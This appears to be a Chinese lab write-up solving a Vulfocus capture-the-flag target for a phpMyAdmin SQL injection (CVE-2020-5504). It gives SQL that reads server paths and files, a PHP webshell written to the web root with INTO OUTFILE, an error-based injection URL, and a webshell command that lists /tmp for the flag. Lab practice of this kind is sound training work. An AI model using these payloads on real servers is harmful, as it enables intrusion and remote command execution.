# 原创
：  【漏洞复现-phpmyadmin-SQL注入】vulfocus/phpmyadmin-cve_2020_5504

# 【漏洞复现-phpmyadmin-SQL注入】vulfocus/phpmyadmin-cve_2020_5504

**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[1.3、描述：](#1.3%E3%80%81%E6%8F%8F%E8%BF%B0%EF%BC%9A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.4、解题：](#2.4%E3%80%81%E8%A7%A3%E9%A2%98%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[Vulfocus 漏洞威胁分析平台](https://vulfocus.cn/)
123.58.224.8:64697


（看见这种页面，一般人就直接放弃了）





> 
<h3>1.2、知识:</h3>
1、&lt;pre&gt;
pre 元素可定义预格式化的文本。被包围在 pre 元素中的文本通常会保留空格和换行符。而文本也会呈现为等宽字体。
&lt;pre&gt; 标签的一个常见应用就是用来表示计算机的源代码
2、写马
select into outfile "/path/file"
（知道log路径，也可以写入log中，如select '&lt;?php eval($_GET[g]);?&gt;'）



> 
<h3>1.3、描述：</h3>
基于Web的MySQL数据库管理工具。该工具能够创建和删除数据库，创建、删除、修改数据库表，执行SQL脚本命令等
（mysql是不允许外网连接的，有第三方工具就方便多了）


---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>
URL后面加上/pma/index.php
（进入到了登陆页面）
提示的
账号密码root/123456


 执行SQL语句<img alt="" height="904" src="https://img-blog.csdnimg.cn/7e4fea51e4f74fabbc19d9a7e70d671a.png" width="1200"/>
输入
select @@datadir
（查询数据库的路径）

select @@basedir
（查询MYSQL数据库的安装路径）

 网站路径就凭经验和爆破了
SELECT load_file('/var/www/html/pma/index.php')
返回数据包4kb，一看就有东西，就对了
所以网站绝对路径为/var/www/html/pma

<hr/>
写马
select '&lt;?php echo \'&lt;pre&gt;\';system($_GET[\'cmd\']); echo \'&lt;/pre&gt;\'; ?&gt;' INTO OUTFILE '/var/www/html/pma/shell.php'

<hr/>
其他思路：
在sql执行环境下也有其他方法传参（但太过于复杂，token还需要截取点击go后的数据包来填）
http://ip:port/pma/server_privileges.php?**ajax_request**=true&amp;**validate_username**=1&amp;**username**=1%27and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))–+db=&amp;**token=**&amp;**viewing_mode=**server
而且要一级一级往下去查询
（所以能写马，就写马）


---


> 
<h3>2.4、解题：</h3>

使用写入的参数cmd传入值 
刚开始用的cat读取文件（一想才知道flag是文件名）

http://ip:port/pma/shell.php?cmd=ls /tmp


